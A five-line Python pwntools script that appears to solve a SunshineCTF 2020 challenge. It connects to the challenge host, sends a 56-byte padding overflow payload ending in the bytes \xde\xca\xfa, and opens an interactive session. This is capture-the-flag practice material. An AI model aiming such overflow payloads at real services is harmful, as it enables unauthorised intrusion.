from pwn import *
r = remote('chal.2020.sunshinectf.org', 30000)
r.recv(1024)
r.sendline(b'a'*56+b'\xde\xca\xfa')
r.interactive()
